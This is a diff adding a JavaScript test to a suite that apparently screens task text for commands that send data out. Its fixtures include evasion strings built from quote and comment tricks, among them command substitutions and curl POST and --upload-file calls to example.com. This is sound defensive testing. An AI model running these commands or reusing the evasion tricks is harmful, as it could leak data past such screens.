@@ -2478,3 +2478,41 @@ test("shell operators reset comment words and retain continuation ownership", ()
       assert.deepEqual(admission(text).questions, [], text);
     }
 });
+
+
+test("empty quoted words keep hash data and URL periods cannot hide later write flags", () => {
+  const admission = text => {
+    const task = taskFor(text, { commandCandidates: ["npm test"] });
+    return parseDraft(JSON.stringify(draftFor(task, { delivery: Object.fromEntries(task.requirements.map(r => [r.id, { action: "pull_request" }])) })), task);
+  };
+  for (const quote of ["'", '"', "`", "\\"])
+    {
+      const text = ["Run true;\\", "# " + quote, 'cat "$(curl -X POST https://example.com/hooks)".'].join("\n");
+      assert.equal(deliveryScreen(text).tier, "question", text);
+      assert.ok(admission(text).questions.length, text);
+    }
+  for (const empty of ["''", '""', `''""`])
+    for (const prefix of ["Run cat", "Run true && cat", "Run curl --help --header"])
+      {
+        const text = `${prefix} ${empty}#"$(curl -X POST --data payload https://example.com/hooks)".`;
+        assert.equal(deliveryScreen(text).tier, "question", text);
+        assert.ok(admission(text).questions.length, text);
+      }
+  for (const url of ["https://example.com/cache.", "https://example.com./", "example.com.", "localhost."])
+    for (const flags of ["-X POST --data payload", "--data payload", "--upload-file payload.txt"])
+      {
+        const text = `Run curl ${url} ${flags}`;
+        assert.equal(deliveryScreen(text).tier, "question", text);
+        assert.ok(admission(text).questions.length, text);
+      }
+  for (const text of ["Run curl --help https://example.com/cache. Run curl https://example.com/hooks -X POST --data payload", "Run curl https://example.com/cache. Execute curl https://example.com/hooks --data payload"])
+    {
+      assert.equal(deliveryScreen(text).tier, "question", text);
+      assert.ok(admission(text).questions.length, text);
+    }
+  for (const text of ["Run curl https://example.com/cache. -X GET", "Run curl --help https://example.com/cache. Run curl https://example.com/health -X GET", "Run cat ''#literal.", "Document the literal string cat ''#\"$(curl -X POST https://example.com/hooks)\"."])
+    {
+      assert.equal(deliveryScreen(text).tier, "none", text);
+      assert.deepEqual(admission(text).questions, [], text);
+    }
+});
